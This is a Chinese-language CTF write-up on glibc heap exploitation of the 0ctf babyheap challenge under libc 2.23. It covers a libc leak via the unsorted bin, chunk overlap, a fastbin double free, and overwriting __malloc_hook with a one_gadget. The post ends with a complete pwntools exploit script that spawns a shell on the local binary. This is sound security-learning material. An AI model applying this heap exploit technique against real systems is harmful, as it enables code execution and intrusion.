---
title: malloc hook
tags: [ctf-pwn,heap]
date: 2023-11-04 10:42:00
categories: [ctf-pwn]
excerpt: malloc hook 泄露libc
---

### 关于什么时候是0x58，什么时候是0x60

是因为tcache的问题，之前一直都不知道（

```python
main_arena = u64(p.recvuntil(b'\x7f')[-6:].ljust(8,b'\x00')) - 0x60 # tcache
main_arena = u64(p.recvuntil(b'\x7f')[-6:].ljust(8,b'\x00')) - 0x58 # no tcache
main_arena = u64(p.recvuntil(b'\x7f')[-6:].ljust(8,b'\x00')) - offset # other condition(not unsorted bin leak)
malloc_hook = main_arena - 0x10
libc_base = malloc_hook - libc.sym['__malloc_hook']
```

### malloc hook - 0x23

在malloc hook - 0x23分配fakechunk可以达成size=0x70的检查，因为这个地址上size这里是0x7f，而检查机制不会检查标志位

> libc2.31版本中这个位置上的数据已经不再是0x7f

### 0ctfbabyheap

首先查看保护，发现全开

![](/img/0ctfbabyheap/media/2e4d9896a3691192ef608f635d67cde1.png)

然后题目里告诉了是2.23版本的libc，先用patchelf换一下libc的位置。

![](/img/0ctfbabyheap/media/f4d73666de533ddaed7caef8222b2ccf.png)

然后打开ida查看漏洞点

发现问题出在fill函数里，大小是用户输入的，可以溢出

![](/img/0ctfbabyheap/media/e17462f8199dc6d45437fb7e604f6c4b.png)

溢出的结果是可以控制下一个chunk的prevsz和inuse bit，将下一个chunk free之后可以合并前面的free chunk。如果被合并的部分里有可以uaf的部分，就可以泄露unsorted bin的头节点mainarena+88的地址，然后泄露libc基地址。

然后由于可以修改块的大小，可以通过把chunk从unsorted bin里切分拿出来，造成chunk overlapping，然后就可以绕过题目自带的检查，实施fastbin attack的double free（通过free两个序号不同，但是实际地址相同的chunk），结果就是可以实现伪造chunk中的任意地址写，然后就可以把前面泄露的libc中的one_gadget覆盖到malloc hook地址上，然后下一次malloc的时候就会调用execve(...binsh...)。

具体调试过程如下：

首先malloc几个chunk进去，然后free掉前两个

![](/img/0ctfbabyheap/media/d2c594003ca8f723af882a81bbbe1a68.png)

可以看到大小位0x100的chunk被放到了unsrted bin里，大小为0x80的放在了fastbin里

![](/img/0ctfbabyheap/media/4aa0984ec87d5b2721a1b63d3c0b0c35.png)

然后把0x80的chunk再分配出来，进行溢出到chunk 2

![](/img/0ctfbabyheap/media/b9f09f039c80b6c859a240d87234f2ed.png)

可以看到下一个chunk被改成了inuse为0的状态，prevsize被修改成了0x180，也就是前面两个chunk合并起来的大小

![](/img/0ctfbabyheap/media/85331735315afc1ca327cebb35515deb.png)

如果这时候free掉chunk2，会把最开头的chunk从unsorted bin里拿出来，与其进行合并，然后合并之后的chunk一起被放在unsorted bin里。由于合并的过程把中间的chunk 1给合并进去了，但是它还是被分配的状态，就可以进行chunk内容的输出泄露。

![](/img/0ctfbabyheap/media/be30a52291628b8928b773d513e70516.png)

![](/img/0ctfbabyheap/media/fde0bcc5e16b386bd5e757816bca0c8e.png)

![](/img/0ctfbabyheap/media/35f83a6472e30559fbcaafe98ab0f101.png)

形成了0x280这个大的chunk中嵌套着一个小的处于被分配的chunk的overlapping。而这个chunk处于0x280这个大块的0x100偏移处，想要通过它打印出来fd和bk要把这个unsorted bin切割一下。

![](/img/0ctfbabyheap/media/ebc1e7f864fc9b1007afad94f5096a31.png)

![](/img/0ctfbabyheap/media/21336897cb0da16774853f0e20bbefb0.png)

这样就有了两个处于完全相同地址上的free、malloc状态的chunk。

然后dump malloc状态的块，就会把free状态的chunk的fd bk打印出来，而这个fd bk由于unsorted bin里只有这一个chunk节点，fd bk会指向malloc_state结构体里的unsorted bin数组项，对应main_arena+88的位置，根据这个便宜可以确定libc的基地址。

![](/img/0ctfbabyheap/media/3b3ade9638161cf21a58f60c6558832b.png)

![](/img/0ctfbabyheap/media/4d12325def65c8eab07cc7712b394a95.png)

然后需要进行一个fast bin attack的double free，具体过程为：

free chunk a， free chunk b，free chunk a，malloc chunk a， malloc chunk b， edit chunk a，malloc chunk a，malloc 任意地址的chunk进行edit。

首先，不连续free a两次的原因是会有检查机制，bins会检查当前链表顶部的chunk的地址和现在free的地址是否相同，相同会被视为double free，但如果中间free了其它chunk，则会绕过这个检查。然后malloc a之后编辑它的fd，下次malloc 的时候自己写入的fd指向的地址会被视为一个chunk，然后malloc出来就可以对其进行写入，完成任意地址写。

上述流程在这道题里的表述为：

![](/img/0ctfbabyheap/media/aa97c259cc69d78bd91e0337b0db3725.png)

被写入的地方是malloc hook，如果malloc 时这上面的地址不是0，就会执行malloc hook指向的函数。向这个地址写入一段gadget的地址。

需要说明的点在于one_gadget得到的调用execve binsh的代码

![](/img/0ctfbabyheap/media/530dce4d01190360fdb9f3bcfb99a79c.png)

选用的是第二个0x4526a（这个我不知道为啥大家都用它，其他几个没试过）

然后通过fast bin attack 就执行了execve，拿到shell

测试：

在buuoj上打开这道题，验证了一下exp确实是对的。

![](/img/0ctfbabyheap/media/cf295e9198a01c7f4e082b7ccd607e5a.png)



```python
# Import pwntools
from pwn import *

# First establish the target process and libc file
target = process('./0ctfbabyheap', env={"LD_PRELOAD":"./libc-2.23.so"}) # The ld_preload is used to switch out the libc version we are using
#gdb.attach(target)
elf = ELF('libc-2.23.so')

# Establish the functions to interact with the program
def alloc(size):
	target.recvuntil(b"Command: ")
	target.sendline(b"1")
	target.recvuntil(b"Size: ")
	target.sendline(str(size).encode())

def fill(index, size, content):
	target.recvuntil(b"Command: ")
	target.sendline(b"2")
	target.recvuntil(b"Index: ")
	target.sendline(str(index).encode())
	target.recvuntil(b"Size: ")
	target.sendline(str(size).encode())
	target.recvuntil(b"Content: ")
	target.send(content)

def free(index):
	target.recvuntil(b"Command: ")
	target.sendline(b"3")
	target.recvuntil(b"Index: ")
	target.sendline(str(index).encode())

def dump(index):
	target.recvuntil(b"Command")
	target.sendline(b"4")
	target.recvuntil(b"Index: ")
	target.sendline(str(index).encode())
	target.recvuntil(b"Content: \n")
	content = target.recvline()
	return content

# Make the initial four allocations, and fill them with data
alloc(0xf0)# Chunk 0
alloc(0x70)# Chunk 1
alloc(0xf0)# Chunk 2
alloc(0x30)# Chunk 3
fill(0, 0xf0, "0"*0xf0)
fill(1, 0x70, "1"*0x70)
fill(2, 0xf0, "2"*0xf0)
fill(3, 0x30, "3"*0x30)

# Free the first two
free(0)# Chunk 0
free(1)# Chunk 1

# Allocate new space where chunk 1 used to be, and overflow chunk chunk 2's previous size with 0x180 and the previous in use bit with 0x0 by pushing 0x100
alloc(0x78)# Chunk 0
fill(0, 128, b'4'*0x70 + p64(0x180) + p64(0x100))

# Free the second chunk, which will bring the edge of the heap before the new chunk 0, thus effictively forgetting about Chunk 0
free(2)

# Allocate a new chunk that will move the libc address for main_arena+88 into the content 
alloc(0xf0)# Chunk 1
fill(1, 0xf0, '5'*0xf0)

# Print the contents of chunk 0, and filter out the main_arena+88 infoleak, and calculate the offsets for everything else
leak = u64(dump(0)[0:8])
libc = leak - elf.symbols['__malloc_hook'] - 0x68
system = libc + 0x4526a
malloc_hook = libc + elf.symbols['__malloc_hook']
free_hook = libc + elf.symbols['__free_hook']
fake_chunk = malloc_hook - 0x23
log.info("Leak is:        " + hex(leak))
log.info("System is:      " + hex(system))
log.info("Free hook is:   " + hex(free_hook))
log.info("Malloc hook is: " + hex(malloc_hook))
log.info("Fake chunk is:  " + hex(fake_chunk))
log.info("libc is:        " + hex(libc))

# Free the first chunk to make room for the double free/fastbin duplicaion
free(1)

# Allocate the next four chunks, chunk 5 will directly overlap with chunk 0 and both chunks will have the same pointer
alloc(0x10)# Chunk 1
alloc(0x60)# Chunk 2
alloc(0x60)# Chunk 4
alloc(0x60)# Chunk 5

# Commence the double free by freeing 5 then 0, and 4 in between to stop a crash
free(5)
free(4)
free(0)

# Allocate 2 chunks, fill in the chunk that was freed twice with the fake chunk, allocate that chunk again to add the fake chunk to the free list
alloc(0x60)# Chunk 4
alloc(0x60)# Chunk 5
fill(0, 0x60, p64(fake_chunk) + p64(0) + b'y'*0x50)
alloc(0x60)# Chunk 0

# Allocate the fake chunk, and write over the malloc hook with the One Shot Gadget
alloc(0x60)# Chunk 6
fill(6, 0x1b, b'z'*0x13 + p64(system))

# Trigger a Malloc call to trigger the malloc hook, and pop a shell
target.sendline(b'1\n1\n')
target.recvuntil(b"Size: ")

# Drop to an interactive shell to use the shell
target.interactive()
```

